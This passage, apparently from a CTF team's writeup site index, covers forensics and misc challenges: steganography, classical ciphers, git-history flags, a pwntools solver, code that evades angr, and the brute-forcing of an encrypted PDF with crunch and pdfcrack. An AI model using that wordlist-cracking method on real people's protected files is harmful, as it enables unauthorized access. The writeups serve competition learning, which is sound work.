darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#knot-65","text":"","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#description","text":"Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password.","title":"Description"},{"location":"forensics/DarkCTF/Knot-65/Knot/#solution","text":"So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open(\"file.txt\",\"r\") r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Solution"},{"location":"forensics/DarkCTF/Powershell/Powershell/","text":"PowerShell Solved by : Sridevi Description I want to know what is happening in my Windows Powershell. Solution We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#powershell","text":"Solved by : Sridevi","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#description","text":"I want to know what is happening in my Windows Powershell.","title":"Description"},{"location":"forensics/DarkCTF/Powershell/Powershell/#solution","text":"We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"Solution"},{"location":"forensics/DawgCTF/Deserted-island/","text":"Deserted Island Toolkit Challenge Descritpion: What would a drunken sailor do? (Wrap the output in DawgCTF{ }) Challenge file - On analysing the given zip file we find a .cdda file. - On opening that file in audacity and viewing it in spectrogram, we find a morse code: ... ----- ... .. ... -. --- - - .... . .- -. ..... .-- ...-- .-. - And decoding it gives the flag DawgCTF{S0SISNOTTHEAN5W3R}","title":"Deserted island"},{"location":"forensics/DawgCTF/Deserted-island/#deserted-island-toolkit","text":"","title":"Deserted Island Toolkit"},{"location":"forensics/DawgCTF/Deserted-island/#challenge-descritpion","text":"What would a drunken sailor do? (Wrap the output in DawgCTF{ }) Challenge file - On analysing the given zip file we find a .cdda file. - On opening that file in audacity and viewing it in spectrogram, we find a morse code: ... ----- ... .. ... -. --- - - .... . .- -. ..... .-- ...-- .-. - And decoding it gives the flag DawgCTF{S0SISNOTTHEAN5W3R}","title":"Challenge Descritpion:"},{"location":"forensics/DawgCTF/moses/","text":"Moses Challenge Descritpion: If you can find a way to part the waves, you might find something on the seafloor. Challenge file - On analysing the given zip file we find 2 audio files, with almost similiar audio - Import both to audacity together - Select and invert only the first audio - Then select both the audios and export it as an mp3 or wav - Open the new mp3 in audacity, its almost silence, but viewing it in spectrogram shows the flag DawgCTF{sunk3n_tr3asur3s}","title":"Moses"},{"location":"forensics/DawgCTF/moses/#moses","text":"","title":"Moses"},{"location":"forensics/DawgCTF/moses/#challenge-descritpion","text":"If you can find a way to part the waves, you might find something on the seafloor. Challenge file - On analysing the given zip file we find 2 audio files, with almost similiar audio - Import both to audacity together - Select and invert only the first audio - Then select both the audios and export it as an mp3 or wav - Open the new mp3 in audacity, its almost silence, but viewing it in spectrogram shows the flag DawgCTF{sunk3n_tr3asur3s}","title":"Challenge Descritpion:"},{"location":"forensics/DawgCTF/these-ladies/","text":"These Ladies Paved Your Way Challenge Descritpion: Per womenintech.co.uk, these 10 women paved your way as technologists. One of them holds more than 100 issued patents and is known for writing understandable textbooks about network security protocols. What other secrets does she hold? Challenge file - On analysing the given zip file we find many images of women - On googling about 100 issued patents and is known for writing understandable textbooks about network security protocols , we find that its related to Radia Perlman and we find an image named radia_perlman.jpg in zip file - Running exiftool on the image we find VpwtPBS{r0m5 0W t4x3IB5} (looks like a potential flag) and U3Bhbm5pbmdUcmVlVmlnCg== - On b64decoding the latter text, we get the key 'SpanningTreeVig' - And then it's just a vignere cipher decoding and we get the flag DawgCTF{l0t5 0F p4t3NT5}","title":"These ladies"},{"location":"forensics/DawgCTF/these-ladies/#these-ladies-paved-your-way","text":"","title":"These Ladies Paved Your Way"},{"location":"forensics/DawgCTF/these-ladies/#challenge-descritpion","text":"Per womenintech.co.uk, these 10 women paved your way as technologists. One of them holds more than 100 issued patents and is known for writing understandable textbooks about network security protocols. What other secrets does she hold? Challenge file - On analysing the given zip file we find many images of women - On googling about 100 issued patents and is known for writing understandable textbooks about network security protocols , we find that its related to Radia Perlman and we find an image named radia_perlman.jpg in zip file - Running exiftool on the image we find VpwtPBS{r0m5 0W t4x3IB5} (looks like a potential flag) and U3Bhbm5pbmdUcmVlVmlnCg== - On b64decoding the latter text, we get the key 'SpanningTreeVig' - And then it's just a vignere cipher decoding and we get the flag DawgCTF{l0t5 0F p4t3NT5}","title":"Challenge Descritpion:"},{"location":"forensics/DawgCTF/Tag/tag/","text":"Tag, You're It! Challenge points : 300 Challenge Descritpion: Keeping your music library labeled and organized is like a full time job sometimes. Solution I used \"exiftool\" to see the metadata of the file where I found a fake flag DogeCTF{wr0te_0ut_th3s3_1yrics_by_hand_1ma0} .I found the flag under \"Comment\" which was not clear. Then I manually retyped the flag. Flag : DawgCTF{wh0_d0wnl0ads_mus1c_anym0r3?}","title":"Tag, You're It!"},{"location":"forensics/DawgCTF/Tag/tag/#tag-youre-it","text":"Challenge points : 300","title":"Tag, You're It!"},{"location":"forensics/DawgCTF/Tag/tag/#challenge-descritpion","text":"Keeping your music library labeled and organized is like a full time job sometimes.","title":"Challenge Descritpion:"},{"location":"forensics/DawgCTF/Tag/tag/#solution","text":"I used \"exiftool\" to see the metadata of the file where I found a fake flag DogeCTF{wr0te_0ut_th3s3_1yrics_by_hand_1ma0} .I found the flag under \"Comment\" which was not clear. Then I manually retyped the flag. Flag : DawgCTF{wh0_d0wnl0ads_mus1c_anym0r3?}","title":"Solution"},{"location":"forensics/TAMUCTF22/Taxes/Taxes/","text":"Taxes Solved by : Sridevi Description Solution We are given a zip file. Unzip the file, we get an encrypted pdf file. There is a hint given in the description that the password of the pdf file is a SSN nuber, which is nine-digit number that the U.S. government issues to all U.S. citizens which basically means that the password length is 9. Used \"crunch\" ( a utility to generate wordlists using letters, numbers, and symbols for every possible combination) to create a wordlist with 9 digit numbers of all the combinations. Then used the tool 'pdfcrack' with the created wordlist and got the password after a few hours :P The password was '694705124'. Opened the pdf file with this password and got the flag. gigem{hope_you_did_your_taxes_already} We got the flag!","title":"Taxes"},{"location":"forensics/TAMUCTF22/Taxes/Taxes/#taxes","text":"Solved by : Sridevi","title":"Taxes"},{"location":"forensics/TAMUCTF22/Taxes/Taxes/#description","text":"","title":"Description"},{"location":"forensics/TAMUCTF22/Taxes/Taxes/#solution","text":"We are given a zip file. Unzip the file, we get an encrypted pdf file. There is a hint given in the description that the password of the pdf file is a SSN nuber, which is nine-digit number that the U.S. government issues to all U.S. citizens which basically means that the password length is 9. Used \"crunch\" ( a utility to generate wordlists using letters, numbers, and symbols for every possible combination) to create a wordlist with 9 digit numbers of all the combinations. Then used the tool 'pdfcrack' with the created wordlist and got the password after a few hours :P The password was '694705124'. Opened the pdf file with this password and got the flag. gigem{hope_you_did_your_taxes_already} We got the flag!","title":"Solution"},{"location":"forensics/TAMUCTF22/Vanity/Vanity/","text":"Vanity Description Solution We are given a gif in the description which gives us a hint \"mirror\". So we try git clone --mirror https://github.com/tamuctf/vanity.git Check out 'packed-refs', the last commit looks suspicious. Just clone the repository and 'checkout' the last commit. We have sneaky.txt. Opening sneaky.txt gives us the flag. gigem{watch_the_night_and_bleed_for_me}","title":"Vanity"},{"location":"forensics/TAMUCTF22/Vanity/Vanity/#vanity","text":"","title":"Vanity"},{"location":"forensics/TAMUCTF22/Vanity/Vanity/#description","text":"","title":"Description"},{"location":"forensics/TAMUCTF22/Vanity/Vanity/#solution","text":"We are given a gif in the description which gives us a hint \"mirror\". So we try git clone --mirror https://github.com/tamuctf/vanity.git Check out 'packed-refs', the last commit looks suspicious. Just clone the repository and 'checkout' the last commit. We have sneaky.txt. Opening sneaky.txt gives us the flag. gigem{watch_the_night_and_bleed_for_me}","title":"Solution"},{"location":"forensics/TAMUCTF22/Whats-the-diff/whats-the-diff/","text":"Gilberto\u2019s Brother-OSINT Description I made a mistake while making a writeup for a challenge from METACTF 2021. Can you find it? Solution: On unzipping the given zip file, we find readme file and a .git folder The README file has a python script Using git grep and git rev-list revealed the flag we are looking for git grep 'gigem' $(git rev-list --all) Flag gigem{b3_car3ful_b3for3_y0u_c0mmit}","title":"Gilberto\u2019s Brother-OSINT"},{"location":"forensics/TAMUCTF22/Whats-the-diff/whats-the-diff/#gilbertos-brother-osint","text":"","title":"Gilberto\u2019s Brother-OSINT"},{"location":"forensics/TAMUCTF22/Whats-the-diff/whats-the-diff/#description","text":"I made a mistake while making a writeup for a challenge from METACTF 2021. Can you find it?","title":"Description"},{"location":"forensics/TAMUCTF22/Whats-the-diff/whats-the-diff/#solution","text":"On unzipping the given zip file, we find readme file and a .git folder The README file has a python script Using git grep and git rev-list revealed the flag we are looking for git grep 'gigem' $(git rev-list --all)","title":"Solution:"},{"location":"forensics/TAMUCTF22/Whats-the-diff/whats-the-diff/#flag","text":"gigem{b3_car3ful_b3for3_y0u_c0mmit}","title":"Flag"},{"location":"forensics/TJCTF/RAP/Rap/","text":"Rap Goad Solved by : Sridevi Description My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message} Solution Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Rap Goad"},{"location":"forensics/TJCTF/RAP/Rap/#rap-goad","text":"Solved by : Sridevi","title":"Rap Goad"},{"location":"forensics/TJCTF/RAP/Rap/#description","text":"My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message}","title":"Description"},{"location":"forensics/TJCTF/RAP/Rap/#solution","text":"Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Solution"},{"location":"forensics/TamuCTF/Recovery/Recovery/","text":"Recovery Challenge points : 300 Description I needed to copy a flag from my home computer to the mainframe at work, so I used a floppy drive. It looks like a few bytes in the file got corrupted, so I deleted the file thinking it would be fine, but my friend says that\u2019s not enough to prevent hackers from recovering the data. Solution I used Autopsy to recover the delete file which was a GIF file f0000000.gif but it was corrupted. From various resources I learnt about GIF file format and tried to interchange the height and width of the image data of the GIF file and got the flag. Flag : gigem{0u7_0f_516h7_0u7_0f_m1nd}","title":"Recovery"},{"location":"forensics/TamuCTF/Recovery/Recovery/#recovery","text":"Challenge points : 300","title":"Recovery"},{"location":"forensics/TamuCTF/Recovery/Recovery/#description","text":"I needed to copy a flag from my home computer to the mainframe at work, so I used a floppy drive. It looks like a few bytes in the file got corrupted, so I deleted the file thinking it would be fine, but my friend says that\u2019s not enough to prevent hackers from recovering the data.","title":"Description"},{"location":"forensics/TamuCTF/Recovery/Recovery/#solution","text":"I used Autopsy to recover the delete file which was a GIF file f0000000.gif but it was corrupted. From various resources I learnt about GIF file format and tried to interchange the height and width of the image data of the GIF file and got the flag. Flag : gigem{0u7_0f_516h7_0u7_0f_m1nd}","title":"Solution"},{"location":"misc/intro/","text":"Miscellaneous Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category. The contents of this repo This repo contains the writeups of various challenges from CTFs we have attempted in the misc category. HSCTF7 2020 Emojis - Sandhra Bino BlueHensCTF 2021 Conway - Arya Arun Rise and Shine - Adhithya Sree Mohan Mountain Climber - Revathi Transforms - Sri Nimitha Conway - Arya Arun Rise and Shine - Adhithya Sree Mohan Mountain Climber - Revathi Transforms - Sri Nimitha zh3r0CTF - A Small Maniac's game - Shravya Bhaskara TamuCTF pybox - SandraBino ARCHIVAL - Adhithya Sree Mohan ELIZABETH IS MISSING - Adhithya Sree Mohan MARVEL V/S DC - Adhithya Sree Mohan SPECTRAL IMAGING - Adhithya Sree Mohan GILBERTO'S BROTHER - Arya Arun DawgCTF 2021 Two truths and a fib - Adhithya Sree Mohan Third Eye - Adhithya Sree Mohan CircleCon 2021 Angrbox - ph03n1x Easy as Pie - ph03n1x , Arya Arun","title":"Miscellaneous"},{"location":"misc/intro/#miscellaneous","text":"","title":"Miscellaneous"},{"location":"misc/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category.","title":"Introduction"},{"location":"misc/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of various challenges from CTFs we have attempted in the misc category. HSCTF7 2020 Emojis - Sandhra Bino BlueHensCTF 2021 Conway - Arya Arun Rise and Shine - Adhithya Sree Mohan Mountain Climber - Revathi Transforms - Sri Nimitha Conway - Arya Arun Rise and Shine - Adhithya Sree Mohan Mountain Climber - Revathi Transforms - Sri Nimitha zh3r0CTF","title":"The contents of this repo"},{"location":"misc/intro/#-a-small-maniacs-game-shravya-bhaskara","text":"TamuCTF pybox - SandraBino ARCHIVAL - Adhithya Sree Mohan ELIZABETH IS MISSING - Adhithya Sree Mohan MARVEL V/S DC - Adhithya Sree Mohan SPECTRAL IMAGING - Adhithya Sree Mohan GILBERTO'S BROTHER - Arya Arun DawgCTF 2021 Two truths and a fib - Adhithya Sree Mohan Third Eye - Adhithya Sree Mohan CircleCon 2021 Angrbox - ph03n1x Easy as Pie - ph03n1x , Arya Arun","title":"- A Small Maniac's game - Shravya Bhaskara"},{"location":"misc/BlueHensCTF/Conway/conway/","text":"BlueHens CTF Conway presents the falcon - Misc Challenge file On browsing about rle files Found an online decoder Importing the file into it, we directly get the flag.. UDCTF{th3y_c4ll_thems3lves_the_fl4g_smash3rs}","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/Conway/conway/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/Conway/conway/#conway-presents-the-falcon-misc","text":"Challenge file On browsing about rle files Found an online decoder Importing the file into it, we directly get the flag.. UDCTF{th3y_c4ll_thems3lves_the_fl4g_smash3rs}","title":"Conway presents the falcon - Misc"},{"location":"misc/BlueHensCTF/MountainClimber/Mountain_climber/","text":"BlueHens CTF Mountain climber On opening the given image we can find different blocks. - First block: Granite - Second block: Block of Emerald - Third block: Target - Fourth block: Birch log - Fifth block: Loom - Sixth block: Obsidian - Seventh block: Chest - Eight block: Dried kelp block - Ninth block: Block of Emerald - Tenth block: Diorite After trying different ways our flag is first letter of all names. Flag: UDCTF{GETBLOCKED} Names of different blocks in minicraft","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/MountainClimber/Mountain_climber/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/MountainClimber/Mountain_climber/#mountain-climber","text":"On opening the given image we can find different blocks. - First block: Granite - Second block: Block of Emerald - Third block: Target - Fourth block: Birch log - Fifth block: Loom - Sixth block: Obsidian - Seventh block: Chest - Eight block: Dried kelp block - Ninth block: Block of Emerald - Tenth block: Diorite After trying different ways our flag is first letter of all names. Flag: UDCTF{GETBLOCKED} Names of different blocks in minicraft","title":"Mountain climber"},{"location":"misc/BlueHensCTF/Rise%26Shine/rise/","text":"DESCRIPTION Breakfast is the most important meal of the day. Wrap your result in UDCTF{} all caps. HINT: it is one common english word encoded in Baconian SOLUTION It's Baconian cipher. There are 40 stars, of 2 types, along the boundary of the image. When we take those in anti-clockwise order, we will get the baconian \"AAABAAABBBAAAAAABABBABBBAABAAAABBABABBAA\". This can de decoded to \"CHAMPION\". FLAG UDCTF{CHAMPION}","title":"Rise"},{"location":"misc/BlueHensCTF/Rise%26Shine/rise/#description","text":"Breakfast is the most important meal of the day. Wrap your result in UDCTF{} all caps. HINT: it is one common english word encoded in Baconian","title":"DESCRIPTION"},{"location":"misc/BlueHensCTF/Rise%26Shine/rise/#solution","text":"It's Baconian cipher. There are 40 stars, of 2 types, along the boundary of the image. When we take those in anti-clockwise order, we will get the baconian \"AAABAAABBBAAAAAABABBABBBAABAAAABBABABBAA\". This can de decoded to \"CHAMPION\".","title":"SOLUTION"},{"location":"misc/BlueHensCTF/Rise%26Shine/rise/#flag","text":"UDCTF{CHAMPION}","title":"FLAG"},{"location":"misc/BlueHensCTF/Transforms/Transforms/","text":"Challenge name: Transforms Convert me! nc challenges.ctfd.io 30008 We have to do 100 conversion correctly. For example: convert bytearray to hexdigest: [129, 141, 112, 176, 251, 106, 160, 102] @@@@@ convert integer to bytearray: 1639309969325418938 @@@@@ convert bytearray to integer: [55, 107, 189, 150, 85, 213, 147, 94] @@@@@ and so on import binascii from pwn import * def parse_message(message): try: message = message.replace(b\"convert\", b\"\").strip() message = message.replace(b\" @@@@@\", b\"\").strip() base_a = message.split(b\"to\")[0].replace(b\"convert\", b\"\").strip() base_b = message.split(b\"to\")[1].split(b\":\")[0].strip() pivot = (f\"{base_b.decode()}:\").encode() value = message.split(pivot)[-1].strip() return base_a.decode(), base_b.decode(), value except Exception as e: print(f\"Exception raised: {e} with message: {message}\") if name == \" main \": conn = remote('challenges.ctfd.io', 30008) for i in range(0, 120): for j in range(0, 2): print(conn.recvline()) line = conn.recvline() base_a, base_b, value = parse_message(line) print(line) print(f\" Parsed to: from **{base_a}** to **{base_b}** ===> \", value) response = None #1 - Convert start types in byte. stop if base_a == \"bytearray\": bytes_value = bytes( bytearray ( eval ( value ) ) ) elif base_a == \"hexdigest\": bytes_value = bytes.fromhex( value.decode() ) # TypeError: fromhex() argument must be str, not bytes elif base_a == \"string\": bytes_value = value.strip() # (?) elif base_a == \"integer\": bytes_value = (int(value)).to_bytes(8, 'big') #2 - Convert byte from what you want. if base_b == \"bytearray\": response = str( list( bytearray(bytes_value) ) ) elif base_b == \"hexdigest\": response = bytes_value.hex() elif base_b == \"string\": response = bytes_value.strip() elif base_b == \"integer\": response = str( int.from_bytes(bytes_value, byteorder='big', signed=False) ) if response is not None: print(b\"Going to send response ===> \", response) conn.send(response) conn.send(b\"\\n\") print(b\"Response from challenge: \" + conn.recvline()) print(conn.recvline()) print(f\"\\n {i+1} ===================================\\n\") else: print(\"No response was provided\")","title":"Transforms"},{"location":"misc/CircleConCTF/angrbox/","text":"CircleConCTF 21' angrbox Challenge Points : 261 Points Description Write me a program that : - Takes 4 uppercase characters in argv - Verifies the 4 character key and returns 0 if correct - If I find the key , YOU LOSE nc 35.194.4.79 7000 Attachment <<<<<<< HEAD angrbox.zip ======= angrbox.zip cdf2e60e000d0a14f8aa282c5760a3a44d30b574 Writeup TL:DR - Pass on a C program to check the arguments against a predefined 4 character string - Use path explosion so that angr would not be able to find a solution - In this case we just used a DLP problem in the check contraint (Interesting fact : We got the solve 3 min before the CTF ended in our first try . Was really exciting xD) Challenge After solving a PoW , the server asks for a C code that takes in a 4 character string as an argument. We are to predefine a particular string in the code and check with the argument string. If both are equal the program returns a 0. The server uses angr to guess the 4 character string in the passed C code within 2 min. print(\"[*] Write me a program that:\") print(\"[*] - Takes 4 uppercase characters in argv\") print(\"[*] - Verifies the 4 character key and returns 0 if correct\") print(\"[*] - If I find the key, YOU LOSE\") print(\"\") print(\"[*] Enter your C code in hex:\") src = bytes.fromhex(input()) if len(src) > 2048: raise MyException(\"[-] Too long nitwit\") print(\"[*] Compiling ...\") filepath = compile(basename, src) print(\"[*] Solving (max 2 minutes) ...\") key = solve_key(filepath) You may find the angr script in solver.py and the session script in session.py if key: print(f\"[-] WoUlD yOu LoOk At ThIs KeY i FoUnD: {key}\") raise MyException(\"[-] This code is WEAK SAUCE\") else: print(\"[*] My solver couldn't find a key >:(\") key = input(\"[*] Gimme ur key and I'll check it: \") if len(key.encode()) != 4: raise MyException(\"[-] The key needs to be 4 characters fool\") if any(c not in string.ascii_uppercase for c in key): raise MyException(\"[-] The key can only contain UPPERCASE characters\") success = check_key(filepath, key) if success: print(\"[*] WTF? YOUR KEY WORKS\") print(\"[*] You are a crypto genius\") flag = open(\"flag.txt\").read().strip() print(f\"[+] Here's your flag: {flag}\") else: raise MyException(\"[-] ARE YOU KIDDING ME? THIS KEY DOESN'T EVEN WORK\") Our aim is to code a program which angr can't guess but returns 0 for the right input and the right input only. Approach 1 Our first thought was to make a script that takes a lot of time for the check. There was a timing constraint of 2 min for angr in the config file. So we thought of putting a sleep(120) so that angr could not guess the value. This is what we tried :- #include<stdio.h> #include<string.h> #include<unistd.h> int main(int argc,char *argv[]) { char str1[4]=\"DBCA\"; sleep(118); if(strcmp(argv[1],str1)==0) return 0;} angr did find the wrong key however, it raises an exception and exits because it does not go to the else condition. if key: print(f\"[-] WoUlD yOu LoOk At ThIs KeY i FoUnD: {key}\") raise MyException(\"[-] This code is WEAK SAUCE\") else: print(\"[*] My solver couldn't find a key >:(\") So even if it did find the wrong key it does not recognize that the solution is wrong because it does not go to the else condition. The only way left was to somehow make angr return the None for the key. 2 Our juniors , Pavani and Revathi came up with the idea to play around with the parameters in the angr.cfg file and so we did. 4lex1 suggested that we use some functions that has a lot of memory utilisation , so that we could exceed angr's memory limitations and thus making it impossible for angr to solve the equation. Thus we starting trying to use memcmp and defining variables outside stack etc. But that just wasnt enough to exceed the memory limit. Being a Crypto gal, the first thing that came to my mind was the Discrete Logarithm Problem. We framed the problem such that the first character of our string is the only solution to our DLP problem and if tried to brute-force, the memory utilisation would just grow exponentially. This was our final C code : int modpow(long long int x,long long int y,long long int n) { int ret = 1; for (; y; x = x * x % n, y >>= 1) { if (y & 1) { ret = ret * x % n; } } return ret; } int main(int argc,char *argv[]) { char *s = argv[1]; char str[] = \"ABCD\"; int x = (int)s[0] << 20; int g = 30; long long int p = 262717555471964216279378282832327568771; long long int y = 8520288065628959452076982415822625519; if(modpow(g,x,p) == y) { if(s[1] == 'B' && s[2] == 'C' && s[3] == 'D') return 0; } } Converting it into hex, and passing it to the server we got the flag. <<<<<<< HEAD ======= cdf2e60e000d0a14f8aa282c5760a3a44d30b574 Flag CCC{p4th_3pl0s10n_4s_a_tr4pd00r_funct10n?_0r_d1d_y0u_ch33s3_1t}","title":"Angrbox"},{"location":"misc/CircleConCTF/angrbox/#circleconctf-21","text":"","title":"CircleConCTF 21'"},{"location":"misc/CircleConCTF/angrbox/#angrbox","text":"Challenge Points : 261 Points","title":"angrbox"},{"location":"misc/CircleConCTF/angrbox/#description","text":"Write me a program that : - Takes 4 uppercase characters in argv - Verifies the 4 character key and returns 0 if correct - If I find the key , YOU LOSE nc 35.194.4.79 7000 Attachment <<<<<<< HEAD angrbox.zip ======= angrbox.zip cdf2e60e000d0a14f8aa282c5760a3a44d30b574","title":"Description"},{"location":"misc/CircleConCTF/angrbox/#writeup","text":"TL:DR - Pass on a C program to check the arguments against a predefined 4 character string - Use path explosion so that angr would not be able to find a solution - In this case we just used a DLP problem in the check contraint (Interesting fact : We got the solve 3 min before the CTF ended in our first try . Was really exciting xD)","title":"Writeup"},{"location":"misc/CircleConCTF/angrbox/#challenge","text":"After solving a PoW , the server asks for a C code that takes in a 4 character string as an argument. We are to predefine a particular string in the code and check with the argument string. If both are equal the program returns a 0. The server uses angr to guess the 4 character string in the passed C code within 2 min. print(\"[*] Write me a program that:\") print(\"[*] - Takes 4 uppercase characters in argv\") print(\"[*] - Verifies the 4 character key and returns 0 if correct\") print(\"[*] - If I find the key, YOU LOSE\") print(\"\") print(\"[*] Enter your C code in hex:\") src = bytes.fromhex(input()) if len(src) > 2048: raise MyException(\"[-] Too long nitwit\") print(\"[*] Compiling ...\") filepath = compile(basename, src) print(\"[*] Solving (max 2 minutes) ...\") key = solve_key(filepath) You may find the angr script in solver.py and the session script in session.py if key: print(f\"[-] WoUlD yOu LoOk At ThIs KeY i FoUnD: {key}\") raise MyException(\"[-] This code is WEAK SAUCE\") else: print(\"[*] My solver couldn't find a key >:(\") key = input(\"[*] Gimme ur key and I'll check it: \") if len(key.encode()) != 4: raise MyException(\"[-] The key needs to be 4 characters fool\") if any(c not in string.ascii_uppercase for c in key): raise MyException(\"[-] The key can only contain UPPERCASE characters\") success = check_key(filepath, key) if success: print(\"[*] WTF? YOUR KEY WORKS\") print(\"[*] You are a crypto genius\") flag = open(\"flag.txt\").read().strip() print(f\"[+] Here's your flag: {flag}\") else: raise MyException(\"[-] ARE YOU KIDDING ME? THIS KEY DOESN'T EVEN WORK\") Our aim is to code a program which angr can't guess but returns 0 for the right input and the right input only.","title":"Challenge"},{"location":"misc/CircleConCTF/angrbox/#approach","text":"1 Our first thought was to make a script that takes a lot of time for the check. There was a timing constraint of 2 min for angr in the config file. So we thought of putting a sleep(120) so that angr could not guess the value. This is what we tried :- #include<stdio.h> #include<string.h> #include<unistd.h> int main(int argc,char *argv[]) { char str1[4]=\"DBCA\"; sleep(118); if(strcmp(argv[1],str1)==0) return 0;} angr did find the wrong key however, it raises an exception and exits because it does not go to the else condition. if key: print(f\"[-] WoUlD yOu LoOk At ThIs KeY i FoUnD: {key}\") raise MyException(\"[-] This code is WEAK SAUCE\") else: print(\"[*] My solver couldn't find a key >:(\") So even if it did find the wrong key it does not recognize that the solution is wrong because it does not go to the else condition. The only way left was to somehow make angr return the None for the key. 2 Our juniors , Pavani and Revathi came up with the idea to play around with the parameters in the angr.cfg file and so we did. 4lex1 suggested that we use some functions that has a lot of memory utilisation , so that we could exceed angr's memory limitations and thus making it impossible for angr to solve the equation. Thus we starting trying to use memcmp and defining variables outside stack etc. But that just wasnt enough to exceed the memory limit. Being a Crypto gal, the first thing that came to my mind was the Discrete Logarithm Problem. We framed the problem such that the first character of our string is the only solution to our DLP problem and if tried to brute-force, the memory utilisation would just grow exponentially. This was our final C code : int modpow(long long int x,long long int y,long long int n) { int ret = 1; for (; y; x = x * x % n, y >>= 1) { if (y & 1) { ret = ret * x % n; } } return ret; } int main(int argc,char *argv[]) { char *s = argv[1]; char str[] = \"ABCD\"; int x = (int)s[0] << 20; int g = 30; long long int p = 262717555471964216279378282832327568771; long long int y = 8520288065628959452076982415822625519; if(modpow(g,x,p) == y) { if(s[1] == 'B' && s[2] == 'C' && s[3] == 'D') return 0; } } Converting it into hex, and passing it to the server we got the flag. <<<<<<< HEAD ======= cdf2e60e000d0a14f8aa282c5760a3a44d30b574","title":"Approach"},{"location":"misc/CircleConCTF/angrbox/#flag","text":"CCC{p4th_3pl0s10n_4s_a_tr4pd00r_funct10n?_0r_d1d_y0u_ch33s3_1t}","title":"Flag"},{"location":"misc/CircleConCTF/easy_as_pie/","text":"CircleConCTF 21' Easy as Pie Challenge Points : 288 Points Description An esoteric sketch, wouldn't you agree? Attachments : delicious.png Writeup On performing a zsteg on the image we get the following Writing it into a file and opening it we see that its a piet code Putting it into a piet interpretor we get the flag CCC{n0th1ng_irr4ti0na1_4b0ut_p1}","title":"Easy as pie"},{"location":"misc/CircleConCTF/easy_as_pie/#circleconctf-21","text":"","title":"CircleConCTF 21'"},{"location":"misc/CircleConCTF/easy_as_pie/#easy-as-pie","text":"Challenge Points : 288 Points","title":"Easy as Pie"},{"location":"misc/CircleConCTF/easy_as_pie/#description","text":"An esoteric sketch, wouldn't you agree? Attachments : delicious.png","title":"Description"},{"location":"misc/CircleConCTF/easy_as_pie/#writeup","text":"On performing a zsteg on the image we get the following Writing it into a file and opening it we see that its a piet code Putting it into a piet interpretor we get the flag CCC{n0th1ng_irr4ti0na1_4b0ut_p1}","title":"Writeup"},{"location":"misc/DarkCTF/quick/","text":"Quickfix Description We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python. Solution Script from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new(\"RGB\", (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i,\"rb+\") as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png') Solution Flag: Flag 